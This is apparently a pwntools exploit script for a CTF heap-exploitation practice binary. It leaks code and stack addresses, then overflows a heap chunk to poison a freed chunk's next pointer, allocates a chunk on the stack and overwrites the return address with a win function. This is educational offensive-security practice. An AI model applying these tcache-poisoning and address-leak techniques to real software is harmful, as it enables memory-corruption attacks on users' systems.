#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level15.0_patched'
p = process(binary)

s = '''
b * malloc
b * free

'''

#gdb.attach(p, s)

context.log_level = 'debug'






# leaking a .text address (get win)
p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline(b"read")
p.sendline("0")
p.sendline("100")
p.sendline(b"AA")

p.sendline(b"echo 0 0")
p.sendline(b"echo 0 224")

p.recvuntil(b"Data: ")
p.recvuntil(b"Data: ")

leak2 = p.recvuntil(b"\n", drop=True)
leak2 = u64(leak2.ljust(8, b"\x00"))
log.info(f"Leaked address 2: {hex(leak2)}")

win = leak2 - 0xd07


p.sendline(b"echo 0 232")
p.recvuntil(b"Data: ")

leak1 = p.recvuntil(b"\n", drop=True)
leak1 = u64(leak1.ljust(8, b"\x00"))
log.info(f"Leaked address 1: {hex(leak1)}")
#gdb.attach(p, s)

win = leak2 - 0x18f8
rip = leak1 + 0x176


# free some chunks, overwrite next* pointer, malloc'ing a stack address and overwrite it with scanf


p.sendline("malloc 2 20")
p.sendline("malloc 3 20")

# free list need one more chunk for the stack chunk
p.sendline("malloc 4 20")
p.sendline("free 4")

# chunk 3 goes to free list
p.sendline("free 3")

# overflow from chunk 2 to metadata of freed chunk 3
p.sendline(b"read")
p.sendline(b"2") 
p.sendline(b"100") 
p.sendline(b'B' * 0x10 + p64(0x20) + p64(0x2) + p64(rip))



p.sendline("malloc 5 20")

#this is the stack chunk
p.sendline("malloc 6 20")


# read into the chunk and write it with win 
p.sendline(b"read")
p.sendline(b"6") 
p.sendline(b"100") 
p.sendline(p64(win))


gdb.attach(p, s)





time.sleep(1)
p.sendline("quit")


p.interactive()



